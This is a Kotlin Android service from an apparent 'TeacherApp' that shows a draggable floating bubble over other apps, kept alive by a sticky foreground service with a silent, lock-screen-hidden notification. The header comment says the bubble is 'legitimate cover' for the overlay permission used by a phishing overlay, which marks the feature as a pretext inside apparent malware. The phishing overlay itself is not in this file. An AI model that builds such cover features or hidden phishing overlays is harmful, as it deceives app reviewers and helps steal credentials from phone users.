package com.example.teacherapp.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat

/**
 * QuickAccessService — shows a draggable chat bubble when app is backgrounded.
 * Tap to reopen, long-press to dismiss.
 * Legitimate cover for SYSTEM_ALERT_WINDOW — same permission used by phishing overlay.
 */
class QuickAccessService : Service() {

    private var windowManager: WindowManager? = null
    private var bubbleView: View? = null

    companion object {
        private const val CHANNEL_ID = "bubble_channel"
        private const val NOTIF_ID   = 9001

        fun start(context: Context) {
            val intent = Intent(context, QuickAccessService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, QuickAccessService::class.java))
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ requires foreground service type
            startForeground(
                NOTIF_ID,
                buildNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }
        showBubble()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        removeBubble()
        super.onDestroy()
    }

    // ── Bubble ────────────────────────────────────────────────────────────────

    private fun showBubble() {
        if (bubbleView != null) return

        val bubble = createBubbleView()

        val params = WindowManager.LayoutParams(
            dp(64), dp(64),
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 300
        }

        var initialX = 0
        var initialY = 0
        var touchX   = 0f
        var touchY   = 0f
        var isDrag   = false
        var longPressTriggered = false

        val longPressHandler  = Handler(Looper.getMainLooper())
        val longPressRunnable = Runnable {
            longPressTriggered = true
            stopSelf()
        }

        bubble.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialX = params.x
                    initialY = params.y
                    touchX   = event.rawX
                    touchY   = event.rawY
                    isDrag   = false
                    longPressTriggered = false
                    longPressHandler.postDelayed(longPressRunnable, 600)
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = event.rawX - touchX
                    val dy = event.rawY - touchY
                    if (dx * dx + dy * dy > 100) {
                        isDrag = true
                        longPressHandler.removeCallbacks(longPressRunnable)
                    }
                    if (isDrag) {
                        params.x = initialX + dx.toInt()
                        params.y = initialY + dy.toInt()
                        windowManager?.updateViewLayout(bubble, params)
                    }
                    true
                }
                MotionEvent.ACTION_UP -> {
                    longPressHandler.removeCallbacks(longPressRunnable)
                    if (!isDrag && !longPressTriggered) {
                        // Tap — bring app back to foreground
                        val launchIntent = packageManager
                            .getLaunchIntentForPackage(packageName)
                            ?.apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                            }
                        launchIntent?.let { startActivity(it) }
                        stopSelf()
                    }
                    true
                }
                else -> false
            }
        }

        bubbleView = bubble
        windowManager?.addView(bubble, params)
    }

    private fun createBubbleView(): View {
        val container = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(dp(64), dp(64))
            setBackgroundColor(Color.TRANSPARENT)
        }

        // Outer glow ring
        val ring = View(this).apply {
            layoutParams = FrameLayout.LayoutParams(dp(64), dp(64))
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#330056D2"))
            }
        }

        // Main blue circle
        val inner = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(dp(52), dp(52)).apply {
                gravity = Gravity.CENTER
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#0056D2"))
                setStroke(dp(2), Color.parseColor("#1A7FFF"))
            }
            elevation = 10f
        }

        // "T" letter
        val letter = TextView(this).apply {
            text = "T"
            textSize = 22f
            setTextColor(Color.WHITE)
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // Red notification dot
        val dot = View(this).apply {
            layoutParams = FrameLayout.LayoutParams(dp(14), dp(14)).apply {
                gravity = Gravity.TOP or Gravity.END
                setMargins(0, dp(3), dp(3), 0)
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#EF4444"))
                setStroke(dp(2), Color.WHITE)
            }
        }

        inner.addView(letter)
        container.addView(ring)
        container.addView(inner)
        container.addView(dot)
        return container
    }

    private fun removeBubble() {
        bubbleView?.let {
            try {
                windowManager?.removeView(it)
                bubbleView = null
            } catch (_: Exception) {}
        }
    }

    // ── Foreground notification (required to keep service alive) ─────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "TeacherApp Bubble",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Floating bubble for quick access"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("TeacherApp")
            .setContentText("Tap the bubble to return")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    private fun dp(value: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            resources.displayMetrics
        ).toInt()
    }
}